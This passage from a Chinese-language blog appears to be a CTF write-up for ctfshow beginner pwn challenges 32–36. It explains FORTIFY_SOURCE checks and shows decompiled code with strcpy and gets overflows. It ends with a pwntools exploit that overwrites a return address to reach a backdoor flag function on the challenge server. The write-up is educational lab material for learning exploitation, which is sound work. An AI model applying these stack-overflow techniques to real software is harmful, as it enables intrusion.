<p>然后使用printf函数输出了buf1中的格式化字符串，并将num的地址作为参数传递给printf函数。</p>
<p>最后的if语句中，如果argc的值大于4（因为存在<code>argv[0]</code>，所以这里默认为1），则调用Undefined函数，打开并读取一个名为”&#x2F;ctfshow_flag”的文件</p>
<p>总之，只要我们让argc的值大于4就能拿到flag了</p>
<p>因为本题目FORTIFY_SOURCE没有开启，代表我们启动函数直接输入4个参数(这时argc&#x3D;5 &gt; 4)就行了，而且这4个参数没有长度限制，如果开启FORTIFY_SOURCE就不好说了，因为开启了之后，由于程序存在strcpy和memcpy函数会检测长度，如果长度超过了限制，可能会使程序抛出异常而退出执行</p>
<p>所以这道题只要输入4个参数就能拿到flag了</p>
<p>ssh连上靶机（密码123456），运行当前目录下的pwnme文件（和我们之前下载的pwn文件是一样的），运行的时候带上4个参数就行了</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./pwnme <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230628105147622.png" alt="image-20230628105147622"></p>
<p>然后程序会停住，这个时候再回车就能拿到flag了</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230628105329250.png" alt="image-20230628105329250"></p>
<hr>
<h3 id="pwn33"><a href="#pwn33" class="headerlink" title="pwn33"></a>pwn33</h3><blockquote>
<p>FORTIFY_SOURCE&#x3D;1</p>
</blockquote>
<p>下载题目附件pwn，丢进虚拟机checksec</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230628105804054.png" alt="image-20230628105804054"></p>
<p>64位，保护除canary全开</p>
<p>丢ida64看看</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">__memcpy_chk</span><span class="token punctuation">(</span>buf1<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v5<span class="token punctuation">,</span> <span class="token number">11LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">__strcpy_chk</span><span class="token punctuation">(</span>buf2<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">11LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>和上一题不同的是memcpy和strcpy这两个函数被替换成了__mencpy_chk和__strcpy_chk安全函数</p>
<p>可以看到这两个函数相比前两个函数只是加上了11LL这个参数加以限制，因为buf1和buf2在声明的时候的长度就是11，所以程序为了防止溢出，使用后两个函数加上这两个数组的长度加以限制以防溢出</p>
<p>但是这里完全不影响我们输入4个参数拿到flag，因为只要我们输入的第一个和第二个参数的长度不超过11就行了</p>
<p>同样方式拿到flag</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230628110352248.png" alt="image-20230628110352248"></p>
<hr>
<h3 id="pwn34"><a href="#pwn34" class="headerlink" title="pwn34"></a>pwn34</h3><blockquote>
<p>FORTIFY_SOURCE&#x3D;2</p>
</blockquote>
<p>下载题目附件pwn，丢进虚拟机checksec</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230628110610809.png" alt="image-20230628110610809"></p>
<p>64位，保护除canary全开</p>
<p>丢进ida64</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">__printf_chk</span><span class="token punctuation">(</span><span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token string">"%s %s\n"</span><span class="token punctuation">,</span> buf1<span class="token punctuation">,</span> buf2<span class="token punctuation">)</span><span class="token punctuation">;</span>
v4 <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">__memcpy_chk</span><span class="token punctuation">(</span>buf1<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v4<span class="token punctuation">,</span> <span class="token number">11LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">__strcpy_chk</span><span class="token punctuation">(</span>buf2<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">11LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">__printf_chk</span><span class="token punctuation">(</span><span class="token number">1LL</span><span class="token punctuation">,</span> <span class="token string">"%s %s\n"</span><span class="token punctuation">,</span> buf1<span class="token punctuation">,</span> buf2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">fgets</span><span class="token punctuation">(</span>buf1<span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> _bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">__printf_chk</span><span class="token punctuation">(</span><span class="token number">1LL</span><span class="token punctuation">,</span> buf1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>和上题不一样的是把printf换成了__printf__chk</p>
<p>区别：</p>
<p>不能使用 %x$n 不连续地打印，也就是说如果要使用 %3$n，则必须同时使用 %1$n 和 %2$n。在使用 %n 的时候会做一些检查</p>
<p>这个涉及到格式化字符串漏洞，但是本题涉及不到</p>
<p>所以一样的方式拿flag就行了</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230628111158816.png" alt="image-20230628111158816"></p>
<hr>
<h1 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h1><h2 id="pwn35"><a href="#pwn35" class="headerlink" title="pwn35"></a>pwn35</h2><p>下载并checksec附件</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230628111448165.png" alt="image-20230628111448165"></p>
<p>32位，保护开了NX和Partial RELRO</p>
<p>丢进ida</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-1Ch]</span>

  stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/ctfshow_flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>stream <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"/ctfshow_flag: No such file or directory."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">signal</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__sighandler_t<span class="token punctuation">)</span>sigsegv_handler<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048910<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048984<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048A00<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048A8C<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048B1C<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048BA0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048C34<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>aClassifyCtfsho<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Stack_Overflow                                          "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : See what the program does!                              "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Where is flag?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> argc <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Try again!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"QaQ!FLAG IS NOT HERE! Here is your input : %s"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ctfshow()函数</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>__cdecl <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>src<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> dest<span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-6Ch] BYREF</span>

  <span class="token keyword">return</span> <span class="token function">strcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> src<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>审计代码</p>
<p>程序首先将&#x2F;ctfshow_flag文件的内容读取到flag变量里，然后打印一些信息</p>
<p>直接看到if语句：</p>
<p>如果<code>argc</code>的值&lt;&#x3D;1，就输出try again。代表我们失败了没拿到flag</p>
<p>如果<code>argc</code>的值 &gt; 1，就进入ctfshow函数，该函数将我们输入的第一个参数也就是<code>argv[1]</code>赋值给dest，然后返回到main函数继续执行，会将argv[1]我们输入第一个参数的内容通过printf函数进行输出</p>
<p>而我们知道<code>strcpy函数</code>没有长度限制，是可以产生栈溢出的</p>
<p>所以我们输入一个字符串，长度要超过dest变量的长度104，就能导致溢出，输出flag</p>
<p>ssh连接靶机</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230628112339740.png" alt="image-20230628112339740"></p>
<hr>
<h2 id="pwn36"><a href="#pwn36" class="headerlink" title="pwn36"></a>pwn36</h2><p>下载并checksec附件</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230628112533321.png" alt="image-20230628112533321"></p>
<p>32位，保护只开了Partial RELRO</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_804883C<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_80488B0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_804892C<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_80489B8<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048A48<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048ACC<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8048B60<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>aClassifyCtfsho<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Stack_Overflow                                          "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : There are backdoor functions here!                      "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Find and use it!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Enter what you want: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argc<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ctfshow()函数</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-28h] BYREF</span>

  <span class="token keyword">return</span> <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里仔细看看反编译出来的几个函数，发现还存在<code>get_flag()</code>函数，但是不在<code>main()</code>函数中</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">get_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+Ch] [ebp-4Ch] BYREF</span>
  FILE <span class="token operator">*</span>stream<span class="token punctuation">;</span> <span class="token comment">// [esp+4Ch] [ebp-Ch]</span>

  stream <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/ctfshow_flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>stream <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"/ctfshow_flag: No such file or directory."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>总之先审计代码</p>
<p>程序先打印信息，然后进入<code>ctfshow()</code>函数，里面存在gets函数</p>
<p>注意gets函数是没有长度限制的，可以发生栈溢出</p>
<p>题目提示我们存在后门函数，也就是刚才发现的<code>get_flag()</code>函数，这个函数能打印flag</p>
<p>所以我们的大致思路就是通过栈溢出，将<code>ctfshow()</code>函数的返回地址覆盖为<code>get_flag()</code>函数的地址，这样我们就可以控制程序的执行流程，进而拿到flag</p>
<p>首先看ida中s[36]数组的大小为36，加上我们还要覆盖掉ebp的值(ebp后面是返回地址，前面是局部变量s数组的栈空间)，</p>
<p>我们需要的填充数据长度就为<code>36 + 4 即 0x28 + 0x4</code>，</p>
<p>我们通过gdb的<code>disass get_flag</code>命令就可以得到get_flag函数的汇编代码，其中就有get_flag函数的首地址</p>
<p>所以我们大致的payload就为：<code>(0x28 + 0x4 ) * b‘a’ + p32(get_flag函数的地址)</code></p>
<p>先得到get_flag函数的地址：</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230628113447690.png" alt="image-20230628113447690"></p>
<p>拿到了get_falg函数的地址：<code>0x8048586</code></p>
<p>然后就能写exp了(python3)</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span> <span class="token string">"28180"</span><span class="token punctuation">)</span>

offset <span class="token operator">=</span> <span class="token number">0x28</span> <span class="token operator">+</span> <span class="token number">0x4</span>
get_flag_addr <span class="token operator">=</span> <span class="token number">0x8048586</span>
payload <span class="token operator">=</span> offset <span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>get_flag_addr<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230628113837303.png" alt="image-20230628113837303"></p>
<p>拿到flag</p>
<hr>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>非常好入门，爱来自web狗</p>

    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: '写点什么吧(●ˇ∀ˇ●)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2026 雲流のLowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>